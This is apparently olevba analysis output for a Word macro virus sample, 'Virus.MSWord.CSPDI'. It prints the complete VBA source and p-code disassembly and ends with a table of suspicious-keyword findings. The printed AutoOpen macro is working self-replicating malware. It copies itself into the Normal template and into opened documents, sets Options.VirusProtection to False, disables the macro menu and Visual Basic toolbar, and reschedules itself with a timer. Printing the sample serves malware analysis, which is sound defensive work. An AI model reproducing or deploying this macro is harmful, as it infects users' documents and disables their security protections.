olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CSPDI
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CSPDI - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.CSPDI - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public Sub MAIN()

Dim MyFile$
Dim OkExist
Dim TemplateName$
Dim internal
Dim xItem
Dim t
Dim s

s = "¸ß¾ÙµËÐ¡Æ½ÀíÂÛÎ°´óÆìÖÄ£¬°Ñ½¨ÉèÓÐÖÐ¹úÌØÉ«Éç»áÖ÷ÒåÊÂÒµÈ«ÃæÍÆÏò¶þÊ®Ò»ÊÀ¼Í"

'ÉèÖÃ´íÎóÏÝÚå
On Error Resume Next

'»ñÈ¡»î¶¯ÎÄ¼þÃû
If ActiveDocument.Path = "" Then
  MyFile$ = ActiveDocument.Name
Else
  MyFile$ = ActiveDocument.Path + "\" + ActiveDocument.Name
End If

If MyFile$ = "" Then GoTo Bye

'Õûµã³öÏÖÈÕÆÚÊ±¼äÐÅÏ¢
t = Format(Time, "hhmmss")
If Mid(t, 3, 2) = "00" And Not (Format(Date, "yyyy") = "1998" And Val(Format(Date, "mm")) < 9) Then
  MsgBox s, vbSystemModal, "CPSDI"
  'MsgBox Format(Date, "dddd,yyyy mmm dd") + "ÈÕ " + Format(Time, "hh") + "Ê±", vbSystemModal, "ÎÒµÄÌáÐÑ"
End If


' ÔÚÍ¨ÓÃÄ£°åÖÐ²éÕÒÊÇ·ñÓÐAutoOpenºê
OkExist = 0
For Each xItem In NormalTemplate.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

' »ñÈ¡Í¨ÓÃÄ£°åµÄÎÄ¼þÃû
TemplateName$ = NormalTemplate.Path + "\" + NormalTemplate.Name

'ÉèÖÃÍ¨ÓÃÄ£°åµÄÎÄ¼þÊôÐÔÎªµµ°¸²¢½â³ýÆä²¡¶¾·À»¤¹¦ÄÜ
SetAttr TemplateName$, vbNormal
Options.VirusProtection = False

' ¿½±´AutoOpenºêµ½Í¨ÓÃÄ£°å
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

' ÔÚ»î¶¯ÎÄµµÖÐ²éÕÒÊÇ·ñÓÐAutoOpenºê
OkExist = 0
For Each xItem In ActiveDocument.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

'¿½±´AutoOpenºêµ½»î¶¯ÎÄµµ
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

Bye:

' ÉèÖÃ×Ô¶¯ÔËÐÐAutoOpenºêµÄ¼ÆÊ±Æ÷
internal = "00:" + Str(10 - Val(Mid(t, 4, 1)))
Application.OnTime When:=Now + TimeValue(internal) - TimeValue("00:00:" + Right(t, 2)), Name:="AutoOpen", Tolerance:=60
DisableMacroMenu
DisableVBTools
End Sub
Public Sub DisableMacroMenu()
'Ê¹¹¤¾ß²Ëµ¥ÖÐµÄºêÃüÁî×éÊ§È¥×÷ÓÃ
Dim cb, xItem, xxItem, xxxItem
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Menu Bar" Then
    For Each xItem In cb.Controls
      If xItem.Caption = "¹¤¾ß(&T)" Then
        For Each xxItem In xItem.Controls
          If xxItem.Caption = "ºê(&M)" Then
            'xxItem.Enabled = True
            For Each xxxItem In xxItem.Controls
                xxxItem.Enabled = False
            Next xxxItem
            Exit Sub
          End If
        Next xxItem
      End If
    Next xItem
  End If
Next cb
End Sub
Public Sub DisableVBTools()
'Ê¹¹¤¾ßÀ¸ÖÐµÄVisual BasicÊ§È¥×÷ÓÃ
Dim cb
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Visual Basic" Then
     cb.Enabled = False
     Exit For
  End If
Next cb
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.CSPDI
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AutoOpen - 5970 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' Line #4:
' 	Dim 
' 	VarDefn MyFile
' Line #5:
' 	Dim 
' 	VarDefn OkExist
' Line #6:
' 	Dim 
' 	VarDefn TemplateName
' Line #7:
' 	Dim 
' 	VarDefn internal
' Line #8:
' 	Dim 
' 	VarDefn xItem
' Line #9:
' 	Dim 
' 	VarDefn t
' Line #10:
' 	Dim 
' 	VarDefn s
' Line #11:
' Line #12:
' 	LitStr 0x0046 "¸ß¾ÙµËÐ¡Æ½ÀíÂÛÎ°´óÆìÖÄ£¬°Ñ½¨ÉèÓÐÖÐ¹úÌØÉ«Éç»áÖ÷ÒåÊÂÒµÈ«ÃæÍÆÏò¶þÊ®Ò»ÊÀ¼Í"
' 	St s 
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x000C "ÉèÖÃ´íÎóÏÝÚå"
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' Line #17:
' 	QuoteRem 0x0000 0x000E "»ñÈ¡»î¶¯ÎÄ¼þÃû"
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St MyFile$ 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St MyFile$ 
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' 	Ld MyFile$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye 
' 	EndIf 
' Line #25:
' Line #26:
' 	QuoteRem 0x0000 0x0014 "Õûµã³öÏÖÈÕÆÚÊ±¼äÐÅÏ¢"
' Line #27:
' 	Ld Time 
' 	LitStr 0x0006 "hhmmss"
' 	ArgsLd Format$ 0x0002 
' 	St t 
' Line #28:
' 	Ld t 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "00"
' 	Eq 
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0004 "1998"
' 	Eq 
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0009 
' 	Lt 
' 	And 
' 	Paren 
' 	Not 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld s 
' 	Ld vbSystemModal 
' 	LitStr 0x0005 "CPSDI"
' 	ArgsCall MsgBox 0x0003 
' Line #30:
' 	QuoteRem 0x0002 0x0066 "MsgBox Format(Date, "dddd,yyyy mmm dd") + "ÈÕ " + Format(Time, "hh") + "Ê±", vbSystemModal, "ÎÒµÄÌáÐÑ""
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' Line #34:
' 	QuoteRem 0x0000 0x0021 " ÔÚÍ¨ÓÃÄ£°åÖÐ²éÕÒÊÇ·ñÓÐAutoOpenºê"
' Line #35:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #36:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #37:
' 	Ld xItem 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	St OkExist 
' Line #39:
' 	ExitFor 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' Line #43:
' 	QuoteRem 0x0000 0x0015 " »ñÈ¡Í¨ÓÃÄ£°åµÄÎÄ¼þÃû"
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Add 
' 	St TemplateName$ 
' Line #45:
' Line #46:
' 	QuoteRem 0x0000 0x0030 "ÉèÖÃÍ¨ÓÃÄ£°åµÄÎÄ¼þÊôÐÔÎªµµ°¸²¢½â³ýÆä²¡¶¾·À»¤¹¦ÄÜ"
' Line #47:
' 	Ld TemplateName$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #49:
' Line #50:
' 	QuoteRem 0x0000 0x0019 " ¿½±´AutoOpenºêµ½Í¨ÓÃÄ£°å"
' Line #51:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #52:
' 	Ld MyFile$ 
' 	ParamNamed Source 
' 	Ld TemplateName$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #53:
' 	EndIfBlock 
' Line #54:
' Line #55:
' 	QuoteRem 0x0000 0x0021 " ÔÚ»î¶¯ÎÄµµÖÐ²éÕÒÊÇ·ñÓÐAutoOpenºê"
' Line #56:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #57:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #58:
' 	Ld xItem 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	St OkExist 
' Line #60:
' 	ExitFor 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' Line #64:
' 	QuoteRem 0x0000 0x0018 "¿½±´AutoOpenºêµ½»î¶¯ÎÄµµ"
' Line #65:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #66:
' 	Ld TemplateName$ 
' 	ParamNamed Source 
' 	Ld MyFile$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #67:
' 	EndIfBlock 
' Line #68:
' Line #69:
' 	Label Bye 
' Line #70:
' Line #71:
' 	QuoteRem 0x0000 0x001F " ÉèÖÃ×Ô¶¯ÔËÐÐAutoOpenºêµÄ¼ÆÊ±Æ÷"
' Line #72:
' 	LitStr 0x0003 "00:"
' 	LitDI2 0x000A 
' 	Ld t 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St internal 
' Line #73:
' 	Ld Now 
' 	Ld internal 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0006 "00:00:"
' 	Ld t 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	Add 
' 	ArgsLd TimeValue 0x0001 
' 	Sub 
' 	ParamNamed When 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x003C 
' 	ParamNamed Tolerance 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0003 
' Line #74:
' 	ArgsCall DisableMacroMenu 0x0000 
' Line #75:
' 	ArgsCall DisableVBTools 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Public Sub DisableMacroMenu())
' Line #78:
' 	QuoteRem 0x0000 0x001E "Ê¹¹¤¾ß²Ëµ¥ÖÐµÄºêÃüÁî×éÊ§È¥×÷ÓÃ"
' Line #79:
' 	Dim 
' 	VarDefn cb
' 	VarDefn xItem
' 	VarDefn xxItem
' 	VarDefn xxxItem
' Line #80:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ForEach 
' Line #81:
' 	Ld cb 
' 	MemLd New 
' 	LitStr 0x0008 "Menu Bar"
' 	Eq 
' 	IfBlock 
' Line #82:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld cb 
' 	MemLd Controls 
' 	ForEach 
' Line #83:
' 	Ld xItem 
' 	MemLd Caption 
' 	LitStr 0x0008 "¹¤¾ß(&T)"
' 	Eq 
' 	IfBlock 
' Line #84:
' 	StartForVariable 
' 	Ld xxItem 
' 	EndForVariable 
' 	Ld xItem 
' 	MemLd Controls 
' 	ForEach 
' Line #85:
' 	Ld xxItem 
' 	MemLd Caption 
' 	LitStr 0x0006 "ºê(&M)"
' 	Eq 
' 	IfBlock 
' Line #86:
' 	QuoteRem 0x000C 0x0015 "xxItem.Enabled = True"
' Line #87:
' 	StartForVariable 
' 	Ld xxxItem 
' 	EndForVariable 
' 	Ld xxItem 
' 	MemLd Controls 
' 	ForEach 
' Line #88:
' 	LitVarSpecial (False)
' 	Ld xxxItem 
' 	MemSt Enabled 
' Line #89:
' 	StartForVariable 
' 	Ld xxxItem 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	ExitSub 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	StartForVariable 
' 	Ld xxItem 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Public Sub DisableVBTools())
' Line #99:
' 	QuoteRem 0x0000 0x0020 "Ê¹¹¤¾ßÀ¸ÖÐµÄVisual BasicÊ§È¥×÷ÓÃ"
' Line #100:
' 	Dim 
' 	VarDefn cb
' Line #101:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ForEach 
' Line #102:
' 	Ld cb 
' 	MemLd New 
' 	LitStr 0x000C "Visual Basic"
' 	Eq 
' 	IfBlock 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld cb 
' 	MemSt Enabled 
' Line #104:
' 	ExitFor 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld cb 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	EndSub 
' Line #108:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

